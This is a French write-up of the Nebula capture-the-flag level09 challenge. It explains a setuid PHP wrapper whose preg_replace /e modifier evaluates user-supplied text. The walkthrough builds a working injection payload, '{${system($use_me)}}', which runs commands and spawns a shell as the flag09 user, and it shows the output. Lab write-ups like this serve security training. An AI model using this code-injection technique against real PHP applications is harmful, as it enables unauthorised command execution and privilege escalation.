# Challenge 09

Voici l'intitulé du challenge :
```
There’s a C setuid wrapper for some vulnerable PHP code.
To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.
```

Cette fois on a accès au code source :
```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>

```

Fonctionnement :
1. On définit une fonction `spam($email)` qui remplace les `.` par des `dot` et les `@`par des `AT` et renvoie l'email traité.
    - *Comportement attendu : `spam(test@mailbox.com)->test AT mailbox dot com`*
2. On définit une deuxieme fonction `markup($filename, $use_me)` qui :
    1. Lis le contenu de `$filename` et ecrit dans `$contents` la string extraite du fichier.
    2. Les 3 lignes suivantes font les opérations suivantes:
        - ligne 1 : cherche des motifs comme `[email]` ou `[email test@mailbox.com]` , capture l'email et remplace chaque occurence par à appel à spam. Le `/e` evalue ce resultat avant de l'injecter.
        - ligne 2 : remplace les `[` par des `<`
        - ligne 3 : remplace les `]` par des `>`
3. Le premier argument est envoyé comme premier paramètre de `markup` et le deuxième argument est envoyé comme deuxième paramètre de `markup`.

On essaye donc le comportement normal et prévu du fichier.
J'écris dans le fichier `/tmp/test_email` :
```
inutile
[email test@mail.com]
inutile2
``` 
Puis je lance le programme :
```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test_email arg_useless
inutile
test AT mail dot com
inutile2
```

### Exploitation

Un élément qui saute aux yeux est que le resultat de la fonction `spam("data")` est évalué.
De plus un des arguments de la fonction `markup()`, `$use_me` est inutilisé et s'appelle USE ME.

Par exemple si je fais : 
```
[email "; phpinfo(); //"]
```
La chaine évaluée devient alors :
```
spam(""; phpinfo(); //"")
```

Et donc : au final :
```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test test
INUTILE1
"; phpinfo(); //"
INUTILE2
```

Si j'essaye d'utiliser la deuxième valeur en testant ce payload.
```
INUTILE1
[email $use_me]
INUTILE2
```
J'obtient : 
```
level09@nebula:/home/flag09$ ./flag09 /tmp/test test
INUTILE1
test
INUTILE2
```

Nous avons toutes les briques du puzzle ,essayons maintenant d'injecter une commande.

Je modifie mon exploit `/tmp/test`:
```
INUTILE1
[email {${system('id')}}]
INUTILE2
```
Et j'obtiens :
```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test "id"
PHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
spam("{${system(\'id\')}}") in /home/flag09/flag09.php on line 15
```

Je vois bien que mes caractère `'` sont escapes.

Que se passe-t-il si j'utilise le deuxième argument donné en paramètre ?
```
INUTILE1
[email {${system($use_me)}}]
INUTILE2
```
```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test "id"
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
PHP Notice:  Undefined variable: uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09) in /home/flag09/flag09.php(15) : regexp code on line 1
INUTILE1

INUTILE2
```

Je vois bien que mon payload a été executé.

Il ne me reste plus qu'à obtenir le flag :
```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test "/bin/sh"
sh-4.2$ id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
sh-4.2$ /bin/getflag
sh-4.2$ You have successfully executed getflag on a target account
```